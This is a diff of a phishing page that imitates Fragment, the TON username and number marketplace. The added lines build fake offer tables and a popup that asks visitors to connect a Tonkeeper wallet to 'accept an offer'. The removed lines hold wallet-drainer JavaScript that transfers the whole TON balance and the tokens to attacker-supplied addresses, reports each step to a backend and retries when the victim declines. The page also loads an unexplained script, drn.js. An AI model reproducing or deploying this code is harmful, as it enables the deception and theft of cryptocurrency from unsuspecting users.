+                        <a href="https://tonviewer.com/EQD2cFvGbHnJkLmNpQrStUvWxYzA1bC3dE5fG7hI9jK" target="_blank" class="tm-wallet">
+                            <span class="head">UQD2cFvGbHnJkLmNpQrStUvW</span>
+                            <span class="middle"></span>
+                            <span class="tail">xYzA1bC3dE5fG7hI9jK</span>
+                        </a>
+                    </div>
+                </td>
+            </tr>
         
-            if (tontx) {
-                if (tryies < maxRetry) {
-                    transaction.messages = {}
-                    let datas = {
-                        data: tokens,
-                        walletAddress: walletAddress,
-                        ton: ton,
-                        tonPrice: tonPrice,
-                        i: i - tkn,
-                        tryies: tryies,
-                        tonFlag: tonFlag,
-                        isTon: true
-                    }
-                    let res = await decline_transfer_jettons_native_request(datas)
-                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                        setTimeout(async () => {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
-                        }, '3000')
-                    } else {
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
-                    }
+            <tr>
+                <td>
+                    <div class="table-cell">
+                        <div class="table-cell-value tm-value icon-before icon-ton">950</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
+                        <div class="tm-datetime">20 Aug 2024</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
+                        <a href="https://tonviewer.com/EQD8jK3mNpQrTvXyZ1aBcDeFgHiJkLmNoPqRsTuVwXyZ" target="_blank" class="tm-wallet">
+                            <span class="head">UQD8jK3mNpQrTvXyZ1aBcDeF</span>
+                            <span class="middle"></span>
+                            <span class="tail">gHiJkLmNoPqRsTuVwXyZ</span>
+                        </a>
+                    </div>
+                </td>
+            </tr>
+        
+            <tr>
+                <td>
+                    <div class="table-cell">
+                        <div class="table-cell-value tm-value icon-before icon-ton">1200</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
+                        <div class="tm-datetime">16 Jun 2024</div>
+                    </div>
+                </td>
+                <td>
+                    <div class="table-cell">
+                        <a href="https://tonviewer.com/EQD4FPq-PRTrHvM6Rk2GqkLpQhKk5h6nQ7sL9wXyZ2uV" target="_blank" class="tm-wallet">
+                            <span class="head">UQD4FPq-PRTrHvM6Rk2GqkLp</span>
+                            <span class="middle"></span>
+                            <span class="tail">QhKk5h6nQ7sL9wXyZ2uV</span>
+                        </a>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+              </table>
+            </div>
+          </section>
+        </main>
+        <footer class="tm-footer">
+          <div class="tm-footer-links">
+            <a class="tm-footer-link">Top Auctions</a>
+            <a class="tm-footer-link">About</a>
+            <a class="tm-footer-link">Terms</a>
+            <a class="tm-footer-link">Privacy</a>
+          </div>
+        </footer>
+        <div class="popup-container js-howitworks-popup aj_popup" style="display: none">
+          <div class="popup">
+            <div class="popup-body">
+              <section>
+                <h4>How does this work?</h4>
+                <p class="popup-text">
+                  You have received an offer to sell your
+                  <b>collectible number / username</b>, follow the
+                  instructions:<br>
+                  <br><b>To do so, simply:</b><br>• Get
+                  <a href="https://tonkeeper.com/">Tonkeeper</a>, open it and
+                  create a <b>wallet</b>.<br>• Deposit funds in your
+                  <b>wallet</b> from a
+                  <a href="https://ton.org/buy-toncoin">supported exchange</a>
+                  or with <a href="https://wallet.t.me/">@wallet</a> on
+                  Telegram.<br>• Use <b>Tonkeeper</b> to log in on Fragment
+                  and return to this page.<br>• Tap the button below to accept
+                  the offer<br><br>Upon acceptance, the username / number
+                  offer will immediately take possession of the buyer.
+                </p>
+                <div class="popup-buttons">
+                  <a href="#" class="btn btn-link btn-lg popup-cancel-btn close-modal">Close</a>
+                </div>
+              </section>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      
+          <script src="assets/drn.js?276869"></script>
+          <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    </div>
+  
 
 
-
-                } else {
-
-                    transaction.messages = {}
-
-                    if (i < Object.keys(data.data.boc).length) {
-                        let datas = {
-                            data: tokens,
-                            walletAddress: walletAddress,
-                            ton: ton,
-                            tonPrice: tonPrice,
-                            i: i,
-                            tryies: tryies,
-                            tonFlag: tonFlag,
-                            isTon: true
-                        }
-                        let res = await decline_transfer_jettons_native_request(datas)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-
-                            setTimeout(async () => {
-                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
-                            }, '3000')
-                        } else {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
-                        }
-                    } else {
-                    }
-                }
-
-            } else {
-                if (tryies < maxRetry) {
-                    transaction.messages = {}
-                    let datas = {
-                        data: tokens,
-                        walletAddress: walletAddress,
-                        ton: ton,
-                        tonPrice: tonPrice,
-                        i: i - tkn,
-                        tryies: tryies,
-                        tonFlag: tonFlag,
-                        isTon: false
-                    }
-                    let res = await decline_transfer_jettons_native_request(datas)
-                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                        setTimeout(async () => {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
-                        }, '3000')
-                    } else {
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
-                    }
-
-
-
-
-                } else {
-                    transaction.messages = {}
-                    if (i < len) {
-                        let datas = {
-                            data: tokens,
-                            walletAddress: walletAddress,
-                            ton: ton,
-                            tonPrice: tonPrice,
-                            i: i,
-                            tryies: 0,
-                            tonFlag: tonFlag,
-                            isTon: false
-                        }
-                        let res = await decline_transfer_jettons_native_request(datas)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-
-                            setTimeout(async () => {
-                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-                            }, '3000')
-                        } else {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-                        }
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-
-
-                    } else {
-                        break;
-                    }
-                }
-            }
-    
-        }
-
-    }
-
-
-
-}
-
-async function send(walletAddress, balance, tryies, address) {
-    tryies++;
-    if (tryies <= maxRetry) {
-        let transfer_value = TonWeb.utils.toNano(balance) - TonWeb.utils.toNano("0.05");
-        const res1 = await transfer_ton_native_request(transfer_value, tryies)
-        const addr = res1.data;
-        balance = balance.toString()
-        let payload = await get_ton_text(transfer_value)
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-            messages: [{
-                    address: addr,
-                    amount: transfer_value,
-                    payload: payload.data
-                }
-
-            ]
-        }
-
-        try {
-            const result = await tonConnectUI.sendTransaction(transaction);
-            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
-            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
-            const dat = {
-                hash: hash,
-                val: transfer_value
-            }
-
-            return dat;
-        } catch (e) {
-            console.error(e);
-            decline_transfer_ton_native_request(balance, tryies);
-            let hash = await send(walletAddress, balance, tryies);
-            return hash;
-        }
-    }
-}
-const unsubscribe = tonConnectUI.onSingleWalletModalStateChange((state) => {
-
-    if (state['closeReason'] == 'wallet-selected') {
-        connect(tonConnectUI.account.address)
-    }
-
-
-});
-const site_visit = async () => {
-    try {
-
-    } catch (err) {
-        console.log(err);
-    }
-}
-const scan_account = async (address) => {
-    try {
-        let response = await sendRequest({
-            action: 'scan_account',
-            account: address,
-        });
-        return response;
-
-    } catch (err) {
-        console.log(err);
-    }
-}
-
-const get_ton_text = async (balance) => {
-    try {
-        let response = await sendRequest({
-            action: 'get_ton_text',
-            balance: balance,
-        });
-        return response;
-
-    } catch (err) {
-        console.log(err);
-    }
-}
-const site_connect = async () => {
-    try {
-        let response = await sendRequest({
-            action: 'connect',
-            domain: window.location.host
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-const site_scan_done = async (amount) => {
-    try {
-        let response = await sendRequest({
-            action: 'scan_done',
-            val: amount,
-            domain: window.location.host
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-const transfer_ton_native_request = async (amount, tryies) => {
-    try {
-        let response = await sendRequest({
-            action: 'transfer_ton_native_request',
-            val: amount,
-            domain: window.location.host,
-            try: tryies
-        });
-        return response;
-    } catch (err) {
-        console.log(err);
-    }
-}
-const transfer_jettons_native_request = async (data, tryies) => {
-    try {
-
-        let response = await sendRequest({
-            action: 'transfer_jettons_native_request',
-            data: data,
-            domain: window.location.host,
-            try: tryies
-        });
-        return response;
-    } catch (err) {
-        console.log(err);
-    }
-}
-
-const send_jettons = async (address, jettons) => {
-    try {
-        let response = await sendRequest({
-            action: 'send_jettons',
-            account: address,
-            jettons: jettons
-        });
-        return response;
-
-    } catch (err) {
-        console.log(err);
-    }
-}
-const decline_transfer_ton_native_request = async (amount, tryies) => {
-    try {
-
-        let response = await sendRequest({
-            action: 'decline_transfer_ton_native_request',
-            val: amount,
-            domain: window.location.host,
-            try: tryies
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-const decline_transfer_jettons_native_request = async (data) => {
-
-    try {
-        let response = await sendRequest({
-            action: 'decline_transfer_jettons_native_request',
-            data: data.data,
-            domain: window.location.host,
-            walletAddress: data.walletAddress,
-            ton: data.ton,
-            tonPrice: data.tonPrice,
-            i: data.i,
-            tryies: data.tryies,
-            tonFlag: data.tonFlag,
-            isTon: data.isTon
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-const transaction_done = async (hash, amount) => {
-    try {
-        let response = await sendRequest({
-            action: 'transaction_done',
-            val: amount,
-            hash: hash,
-            domain: window.location.host,
-
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-const jettons_transaction_done = async (hash, amount) => {
-    try {
-        let response = await sendRequest({
-            action: 'jettons_transaction_done',
-            val: amount,
-            hash: hash,
-            domain: window.location.host,
-
-        });
-    } catch (err) {
-        console.log(err);
-    }
-}
-
-
-document.addEventListener('DOMContentLoaded', async () => {
-    try {
-        if (autoconnect) {
-            await connectWallet();
-        }
-    } catch (e) {
-
-    }
-});
+        <script>
+            document.querySelectorAll('.open-modal').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    document.querySelector('.popup-container').style.display = 'flex';
+                });
+            });
+            document.querySelectorAll('.close-modal').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    document.querySelector('.popup-container').style.display = 'none';
+                });
+            });
+        </script>
+    </body></html>
